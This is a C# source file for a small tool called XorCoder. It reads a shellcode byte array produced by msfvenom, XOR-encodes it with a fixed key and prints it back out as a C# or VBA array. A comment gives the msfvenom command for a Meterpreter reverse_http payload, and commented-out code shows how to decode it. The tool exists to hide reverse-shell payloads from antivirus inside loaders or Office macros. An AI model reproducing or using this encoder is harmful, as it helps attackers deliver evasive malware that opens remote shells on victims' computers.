using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.IO;
using System.Text.RegularExpressions;

namespace XorCoder
{
    public class Program
    {
        public static void Main(string[] args)
        {
            ///////////////////////////////////////////////////////////////////////////////////////////////////////////
            if (args.Length < 1)
            {
                Console.WriteLine("Usage: XORCoder.exe <path_to_payload_text_file> [-VBA]");
                return;
            }

            // path to contents of: msfvenom -p windows/meterpreter/reverse_http LHOST=$LHOST LPORT=$LPORT -f csharp > met.cs
            string filePath = args[0];
            string fileContent = File.ReadAllText(filePath);
            int iXORKey = 0xfa;
            //Console.WriteLine("XOR Key Value = ", + iXORKey);


            //////////////////////////// INPUT STRING PROCESSING //////////////////////////////////////////
            // Strip all newline characters
            fileContent = Regex.Replace(fileContent, @"\r|\n", "");
            // strip starting text before the start of the array: "byte[] buf = new byte[540] {"
            string[] rawString1 = fileContent.Split('{');
            string rawString2 = rawString1[1];
            // strip ending text at the end of the array: "};"
            string[] rawString3 = rawString2.Split('}');
            string rawString4 = rawString3[0];

            // Split the content by commas and convert to bytes
            byte[] buf = rawString4.Split(',')
                                    .Select(s => Convert.ToByte(s.Trim(), 16)) // Assumes hexadecimal values
                                    .ToArray();
            /////////////////////////////////////////////////////////////////////////////////////////



            // Encode the payload with XOR (fixed key)
            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)((uint)buf[i] ^ iXORKey);
            }

            StringBuilder hex;

            if (args.Length > 1)
            {
                switch (args[1])
                {
                    case "-VBA":
                        // Printout VBA payload
                        uint counter = 0;

                        hex = new StringBuilder(encoded.Length * 2);
                        foreach (byte b in encoded)
                        {
                            hex.AppendFormat("{0:D3}, ", b);
                            counter++;
                            if (counter % 25 == 0)
                            {
                                hex.Append("_\n");
                            }
                        }
                        //Console.WriteLine($"XORed VBA payload (key: 0xfa):");
                        Console.WriteLine(hex.ToString());
                        break;
                    default:
                        //Console.WriteLine("Accepted arguments: -VBA to print VBA payload instead of C#");
                        break;
                }
            }
            else
            {
                // Printout C# payload
                hex = new StringBuilder(encoded.Length * 2);
                int totalCount = encoded.Length;
                for (int count = 0; count < totalCount; count++)
                {
                    byte b = encoded[count];

                    if ((count + 1) == totalCount) // Dont append comma for last item
                    {
                        hex.AppendFormat("0x{0:x2}", b);
                    }
                    else
                    {
                        hex.AppendFormat("0x{0:x2}, ", b);
                    }

                    if ((count + 1) % 15 == 0)
                    {
                        hex.Append("\n");
                    }
                }

                //Console.WriteLine($"XORed C# payload (key: 0xfa):");
                Console.WriteLine($"byte[] buf = new byte[{buf.Length}] {{\n{hex}\n}};");
            }

            // Decode the XOR payload
            /*
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }
            */

        }
    }
}